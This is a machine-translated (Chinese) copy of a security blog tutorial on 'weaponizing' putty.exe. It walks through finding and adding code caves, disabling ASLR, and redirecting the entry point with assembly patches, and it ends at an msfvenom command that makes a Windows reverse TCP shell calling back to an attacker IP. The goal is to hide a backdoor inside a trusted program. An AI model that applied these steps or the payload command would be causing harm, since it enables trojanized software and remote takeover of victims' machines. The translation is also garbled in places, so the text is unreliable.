<html>
<head>
<title>[ExpDev] Weaponizing Your Favorite PE — Portable Executable Exploit</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]将您最喜欢的PE武器化—可移植的可执行漏洞利用</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-weaponizing-your-favorite-pe-portable-executable-exploit-c268c0c076c7?source=collection_archive---------0-----------------------#2019-08-30">https://infosecwriteups.com/expdev-weaponizing-your-favorite-pe-portable-executable-exploit-c268c0c076c7?source=collection_archive---------0-----------------------#2019-08-30</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/020feaf21afca8e387af96ca2004d6b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/format:webp/1*_QLSigoNR-4rvo2_3wTFQg.png"/></div></figure><h1 id="ef3d" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">TL；速度三角形定位法(dead reckoning)</h1><p id="5a7b" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">嗨！欢迎来到我的博客。今天我将讨论如何一步一步地将一个合法的PE ( <a class="ae lt" href="https://en.wikipedia.org/wiki/Portable_Executable" rel="noopener ugc nofollow" target="_blank">可移植可执行文件</a>)武器化。我们将在现有的PE文件中添加一个反向shell有效负载，这样当它运行时，它将会给我们一个回调，同时执行它想要的程序。让我们开始吧。</p></div><div class="ab cl lu lv hx lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="im in io ip iq"><h1 id="138f" class="jx jy it bd jz ka mb kc kd ke mc kg kh ki md kk kl km me ko kp kq mf ks kt ku bi translated">设置</h1><ul class=""><li id="8c3f" class="mg mh it kx b ky kz lc ld lg mi lk mj lo mk ls ml mm mn mo bi translated">调试器(<a class="ae lt" href="http://www.ollydbg.de/download.htm" rel="noopener ugc nofollow" target="_blank">OllyDbg</a>| |<a class="ae lt" href="https://www.immunityinc.com/products/debugger/" rel="noopener ugc nofollow" target="_blank">immunity dbg</a>)</li><li id="44e2" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated"><a class="ae lt" href="https://www.aldeid.com/wiki/LordPE" rel="noopener ugc nofollow" target="_blank"> LordPE </a> —体育编辑</li><li id="4235" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated"><a class="ae lt" href="https://xvi32.en.softonic.com/download" rel="noopener ugc nofollow" target="_blank"> XVI32 </a> —十六进制编辑器</li><li id="ab82" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated"><a class="ae lt" href="https://github.com/Antonin-Deniau/cave_miner" rel="noopener ugc nofollow" target="_blank"> Cave Miner </a> —在二进制文件中搜索代码洞穴的工具</li><li id="6417" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">你选择的PE文件(我将使用“<a class="ae lt" href="https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.52.html" rel="noopener ugc nofollow" target="_blank">putty.exe</a>”)</li></ul><h1 id="b26c" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">代码洞穴</h1><p id="575f" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">当你修改你的PE时需要知道的一件重要的事情是利用一个代码洞穴来存储你自己的代码。我们将使用这个代码洞穴将程序执行流程重定向到我们自己的代码，然后将其返回到原始流程，以完成正常的程序流程。此外，请记住，代码洞穴既可用于合法目的，也可用于恶意目的。所以，它并不总是用于坏事:)</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi mu"><img src="../Images/a2427d183fb4fa81f499e4dbd0807eea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EgmyIFTV5y7Zq3I6J_lC0Q.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图1 —代码洞穴</figcaption></figure><p id="e34c" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">有几种不同的方法可以找到您的代码洞穴:</p><ul class=""><li id="02a3" class="mg mh it kx b ky nh lc ni lg nm lk nn lo no ls ml mm mn mo bi translated">[1]在现有PE中找到一个代码洞穴</li><li id="62f5" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">[2]将您自己的代码cave添加到现有的PE中</li></ul><p id="701a" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">让我演示一下这两种策略:</p><h2 id="0aa8" class="np jy it bd jz nq nr dn kd ns nt dp kh lg nu nv kl lk nw nx kp lo ny nz kt oa bi translated">[1]寻找密码洞穴</h2><p id="fd55" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">为此，我们将使用“<a class="ae lt" href="https://github.com/Antonin-Deniau/cave_miner" rel="noopener ugc nofollow" target="_blank"> Cave Miner </a>”来识别“putty.exe”程序中可用的代码洞穴。</p><p id="9879" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated"><code class="fe ob oc od oe b"># code_miner search --size=500 putty.exe</code></p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi of"><img src="../Images/b22b9573009e3b5adf84e768531838d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1124/format:webp/1*4Wzz4_8L6PS__oKsegy8dg.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图2—[代码挖掘器]运行“代码挖掘器”</figcaption></figure><p id="6ed4" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">看来我们可以使用“下的密码洞穴”。从<code class="fe ob oc od oe b">00445CD5</code>的“地址”开始的“数据”部分。现在我们需要确保。数据段配置正确。我们希望启用以下属性:</p><ul class=""><li id="471a" class="mg mh it kx b ky nh lc ni lg nm lk nn lo no ls ml mm mn mo bi translated">可作为代码执行</li><li id="4811" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">易读的</li><li id="d475" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">可写的</li></ul><p id="06a8" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">为此，我们将使用“<a class="ae lt" href="https://www.aldeid.com/wiki/LordPE" rel="noopener ugc nofollow" target="_blank"> LordPE </a>”来修改我们的“putty.exe”</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi og"><img src="../Images/6f986d5090226e7c10ff4abccaf09b72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BMv2flKh8HjrkUmIT2IIhQ.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图3 — [LordPE]点击“PE编辑器”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oh"><img src="../Images/ff9fbbfc48bbbcc3e59462ef97b0af4e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kHQjMudCcuyF-J3uA_fBaA.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图4 — [LordPE]选择“putty.exe”并点击“打开”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/0e97514003e67f4021cd4ca08b4c9e86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/1*-dIeb-82fr8vrvlH408ndg.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图5 — [LordPE]点击“部分”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/8711298df5a335545099ceaf084c056a.png" data-original-src="https://miro.medium.com/v2/resize:fit:968/format:webp/1*6EkRWb09xKwfBnfy9UWIrQ.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图6 — [LordPE]“右击“开”。数据”并选择“编辑选择标题…”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/37c173c99f58f2ca7496f5619c5986ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:604/format:webp/1*8zPfgf-qoxxO8Cpp5naekw.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图7 — [LordPE]点击“…”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/3bdcfcf9bf6bc9b4eaabe0516160af29.png" data-original-src="https://miro.medium.com/v2/resize:fit:704/format:webp/1*K2xPD4b6PTjE_OylyA8qLw.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图8 — [LordPE]确保这三项都被选中。然后点击“确定”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/b355cefe5deb13b7c482e03b0e07f2a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/1*QIKyheHnx-W1sv_cFbRyfA.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图9 — [LordPE]点击“保存”并退出LordPE</figcaption></figure></div><div class="ab cl lu lv hx lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="im in io ip iq"><h2 id="25e9" class="np jy it bd jz nq nr dn kd ns nt dp kh lg nu nv kl lk nw nx kp lo ny nz kt oa bi translated">[2]添加代码洞穴</h2><p id="102b" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">为此，我们将使用“<a class="ae lt" href="https://www.aldeid.com/wiki/LordPE" rel="noopener ugc nofollow" target="_blank"> LordPE </a>”和“<a class="ae lt" href="https://xvi32.en.softonic.com/download" rel="noopener ugc nofollow" target="_blank"> XVI32 </a>”在我们的PE中添加额外的代码洞穴空间。</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi og"><img src="../Images/6f986d5090226e7c10ff4abccaf09b72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BMv2flKh8HjrkUmIT2IIhQ.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图10 — [LordPE]点击“PE编辑器”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oh"><img src="../Images/ff9fbbfc48bbbcc3e59462ef97b0af4e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kHQjMudCcuyF-J3uA_fBaA.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图11 — [LordPE]选择“putty.exe”并点击“打开”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/0e97514003e67f4021cd4ca08b4c9e86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/1*-dIeb-82fr8vrvlH408ndg.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图12 — [LordPE]点击“部分”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi om"><img src="../Images/a7abd6ce0a473ec540fb5f57a5c24583.png" data-original-src="https://miro.medium.com/v2/resize:fit:974/format:webp/1*2asuuPWKWvHLm0tSnl7DBQ.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图13 — [LordPE]“右击”并选择“添加节标题”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi on"><img src="../Images/ce360895f9dc1eb0400c2a1544fb6c7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:972/format:webp/1*xXJevcb0NhAGOAyM7Kmygw.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图14 — [LordPE]”。NewSec“已创建</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/07d89414f3cb8b5afaed5306c95820a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:970/format:webp/1*Bdqk9L9Dhms7Djl6h-G0eA.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图15 — [LordPE]“右击“开”。NewSec”并选择“编辑章节标题…”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/5518decfc3c2a46098b5fbaab7d9d6da.png" data-original-src="https://miro.medium.com/v2/resize:fit:604/format:webp/1*7NlY4yI0xPDqyRPioV3d2w.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图16 — [LordPE]给每个“VirtualSize”和“RawSize”加1，000，然后点击“…”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/3bdcfcf9bf6bc9b4eaabe0516160af29.png" data-original-src="https://miro.medium.com/v2/resize:fit:704/format:webp/1*K2xPD4b6PTjE_OylyA8qLw.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图17 — [LordPE]确保这三项都被选中。然后点击“确定”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi om"><img src="../Images/f8e1c61394e5322e23c3dc614b8d39e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:974/format:webp/1*aQjCCCC8n3_z-ZCK6-EioQ.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图18 — [LordPE]确保“VSize”和“RSize”像上面一样更新，然后关闭窗口</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/b355cefe5deb13b7c482e03b0e07f2a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/1*QIKyheHnx-W1sv_cFbRyfA.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图19 — [LordPE]点击“保存”并退出LordPE</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi op"><img src="../Images/7f34b8bbd9eb6bc14dbb1fda73198395.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/1*bKUeJJ0UfNh9iHbM_TKh9A.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图20 — [Putty]当我们试图执行修改后的“putty.exe”时，它讨厌我们的修改…</figcaption></figure><p id="79b4" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">因此，现在我们需要用空字节填充额外的1000个字节。为此，我们将使用“XVI32”:</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/760ebe5c877d9510585a6e1f9773fd60.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/1*JKi-aaEWc4YWVoPLmyG3lw.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图21 — [XVI32]打开我们修改过的“putty.exe”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi or"><img src="../Images/4b9107e6cd5bc63e578fd6cdcca9f7bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1260/format:webp/1*23gwfhvchpagYFPPXRnBnA.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图22 — [XVI32]移动到文件的底部，选择“编辑”下的“插入字符串…”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi os"><img src="../Images/dd1ec8fa5104a11f1027113935e16f53.png" data-original-src="https://miro.medium.com/v2/resize:fit:762/format:webp/1*ICVTmuldSIJpqbllOKQewg.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图23 — [XVI32]为“十六进制字符串”添加“00 ”,为“十六进制”添加“$1000 ”,然后单击“确定”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/27b53eccc236801e0bad7ebf3048adcc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/1*rU8rPzqrHADpaiKNiRZUZA.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图24 — [XVI32]保存文件并退出“XVI32”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/3f9388b72c4e58f29d0244267e7854e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1178/format:webp/1*x_Omi93xcBAmqxHLO2W59g.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图25 — [Putty]现在我们的“putty.exe”正常执行了</figcaption></figure><p id="9aab" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">太好了。因此，我已经向您展示了如何在我们的PE中找到/添加代码洞穴的两种不同方法。对于这个演示，我将坚持使用第一种方法:<strong class="kx iu">【1】寻找一个洞穴</strong>。现在，让我们进入我们最喜欢的调试部分:)</p></div><div class="ab cl lu lv hx lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="im in io ip iq"><h1 id="530e" class="jx jy it bd jz ka mb kc kd ke mc kg kh ki md kk kl km me ko kp kq mf ks kt ku bi translated">ASLR</h1><p id="eaa8" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">等一下。我们不应该忘记现代的Windows机器都配置了ASLR(地址空间布局随机化)。这将在我们每次执行PE时保持随机的内存地址。绕过ASLR是今天的主题，所以我们将禁用ASLR。我在这个演示中使用的是Windows 7，我们可以在“注册表”中禁用ASLR</p><p id="e5aa" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">转到:</p><p id="70d0" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated"><code class="fe ob oc od oe b">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management</code></p><p id="4545" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">创建:</p><p id="04c2" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated"><code class="fe ob oc od oe b">MoveImages</code></p><p id="01ef" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">设置:</p><p id="9d29" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated"><code class="fe ob oc od oe b">DWORD</code>值为“0”</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ou"><img src="../Images/1c7c4ee29513ffdcce8985564e2157c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pEkAsfdWn0jJIjd0tmvu0g.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图26 —在Win7中禁用ASLR</figcaption></figure><p id="0b1d" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">最后，重启你的机器。</p></div><div class="ab cl lu lv hx lw" role="separator"><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz ma"/><span class="lx bw bk ly lz"/></div><div class="im in io ip iq"><h1 id="6f26" class="jx jy it bd jz ka mb kc kd ke mc kg kh ki md kk kl km me ko kp kq mf ks kt ku bi translated">武器化PE</h1><p id="79bd" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">在我讲述更多细节之前，让我总结一下这是如何工作的:</p><ul class=""><li id="7935" class="mg mh it kx b ky nh lc ni lg nm lk nn lo no ls ml mm mn mo bi translated">将PE文件的开头编辑到JMP到我们的代码洞穴中</li><li id="c0db" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">PUSHAD(所有通用寄存器双字)—将所有八(8)个32位通用寄存器保存到堆栈上</li><li id="1ae1" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">PUSHFD(标志DWORD) —保存EFLAGS值</li><li id="e5e0" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">添加反向外壳</li><li id="977c" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">堆栈对齐(ESP)</li><li id="53d8" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">POPFD —恢复EFLAGS值</li><li id="edf7" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">POPAD —恢复寄存器值</li><li id="51f1" class="mg mh it kx b ky mp lc mq lg mr lk ms lo mt ls ml mm mn mo bi translated">返回到PE文件的开头，完成原来的执行过程</li></ul><h2 id="61ff" class="np jy it bd jz nq nr dn kd ns nt dp kh lg nu nv kl lk nw nx kp lo ny nz kt oa bi translated">JMP到代码洞穴</h2><p id="3d9c" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">我们开始吧。我们现在用“OllyDbg”打开我们的“putty.exe ”(建议以“管理员”身份打开调试器，以避免不必要的警告),并保存前几行以供以后恢复之用。</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/eb0ef75d29b4b542c323a09dffe83626.png" data-original-src="https://miro.medium.com/v2/resize:fit:1066/format:webp/1*sXcKQiN5XgBq1NudyY-nNg.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图27 — [OllyDbg]保存选定的地址和汇编代码</figcaption></figure><pre class="mv mw mx my gt ow oe ox oy aw oz bi"><span id="c1d1" class="np jy it oe b gy pa pb l pc pd">00433E0C &gt;   55             PUSH EBP<br/>00433E0D     8BEC           MOV EBP,ESP<br/>00433E0F     6A FF          PUSH -1<br/>00433E11   . 68 F80C4400    PUSH putty.00440CF8<br/>00433E16   . 68 C0864300    PUSH putty.004386C0</span></pre><p id="b4eb" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">如前所述，我们将使用从第一种方法中找到的代码洞穴地址，<strong class="kx iu"> [1]找到代码洞穴</strong>，<strong class="kx iu"> </strong>，即<code class="fe ob oc od oe b">00445CD5</code>。然而，我们将使用一个地址<code class="fe ob oc od oe b">00445CD6</code>(在我们的代码cave入口点之后的一个地址)来开始我们的外壳代码。</p><p id="8eed" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">使用OllyDbg，让我们将<code class="fe ob oc od oe b">00433E0C PUSH EBP </code>改为<code class="fe ob oc od oe b">JMP 00445CD6</code>,以便重定向我们的执行流，指向我们的代码洞穴的位置，而不是正常执行。</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/c9dd4f76c95e1d693c09504fda28dfaa.png" data-original-src="https://miro.medium.com/v2/resize:fit:656/format:webp/1*zcPSyMMfc5zUiR4ami7YgA.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图28 — [OllyDbg]更改调试程序中的代码</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/f3bfb834faf5b6f3622a74ad74221880.png" data-original-src="https://miro.medium.com/v2/resize:fit:862/format:webp/1*q6tU9-HBSwVPbmtP6N84Wg.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图29 — [OllyDbg] JMP 00445CD6</figcaption></figure><p id="42ca" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">并将修改后的文件的当前版本作为可执行文件保存到“putty-01.exe”，保存每个阶段便于我们做进一步的调试。</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/b21583254da1de02f7ce61f6bdd6dad1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1130/format:webp/1*G5nox1Ff5zxzDB4VexcDOQ.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图30 — [OllyDbg]突出显示修改的部分，“右键单击”，“复制到可执行文件”并单击“选择”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/b6e6fb58807d2f2964e34433f891dd6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1164/format:webp/1*HFohrXnM-QglSp8VMCB1cw.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图31 — [OllyDbg]“右击”并选择“保存文件”</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/8ae5520fff6b6e52161581aa08dd1c5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1288/format:webp/1*aM7fdocqPzEcz9B975x-bA.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图32 — [OllyDbg]输入文件名并点击“保存”</figcaption></figure><p id="bb9a" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">我们现在可以打开“putty-01.exe”用OllyDbg做进一步的修改过程。</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pj"><img src="../Images/fde336051d9119a9520fcbb55b8f9a55.png" data-original-src="https://miro.medium.com/v2/resize:fit:850/format:webp/1*Nl7_DPEIv34sQ4t0FDE_sA.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图33 — [OllyDbg]打开“putty-01.exe”</figcaption></figure><p id="0234" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">如你所见，我们的起始地址<code class="fe ob oc od oe b">00433E0C</code>现在改成了<code class="fe ob oc od oe b">JMP 00445CD6</code>。完美。按<code class="fe ob oc od oe b">F7</code>跟随执行流程。</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pk"><img src="../Images/7a9e14585fad88fadeab70cf9546ccb2.png" data-original-src="https://miro.medium.com/v2/resize:fit:818/format:webp/1*ookWa_n82svBblJmW-dBFw.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图34 — [OllyDbg] "putty-01.exe "</figcaption></figure><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/ec3e6f8502b97384de7a4e51505c3cbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:902/format:webp/1*n1aixJaAhQJeY-XK9-KiIQ.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图35 — [OllyDbg]按下F7进入我们的代码洞穴</figcaption></figure><h2 id="078a" class="np jy it bd jz nq nr dn kd ns nt dp kh lg nu nv kl lk nw nx kp lo ny nz kt oa bi translated">代码洞穴魔法</h2><p id="36d6" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">是时候将以下执行流添加到代码洞穴中了:</p><pre class="mv mw mx my gt ow oe ox oy aw oz bi"><span id="e564" class="np jy it oe b gy pa pb l pc pd">PUSHAD - Save the register values<br/>PUSHFD - Save the flag values<br/>&lt;-- Reverse Shell --&gt;<br/>&lt;-- Stack Alignment (ESP) --&gt;<br/>POPFD - Restore the flag values<br/>POPAD - Restore the register values<br/>&lt;-- Return to the original function --&gt;</span></pre><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi pm"><img src="../Images/c9fd430c0d25ae99579824b489d780d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:860/format:webp/1*TI82CGtu9eVi3iS44MGRmA.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">图36[OllyDbg]-添加“PUSHAD”和“PUSHFD”</figcaption></figure><p id="aede" class="pw-post-body-paragraph kv kw it kx b ky nh la lb lc ni le lf lg nj li lj lk nk lm ln lo nl lq lr ls im bi translated">让我们创建一个十六进制格式的“msfvenom”反向外壳:</p><pre class="mv mw mx my gt ow oe ox oy aw oz bi"><span id="053b" class="np jy it oe b gy pa pb l pc pd">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.117.131 LPORT=443 -f hex</span></pre><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi pn"><img 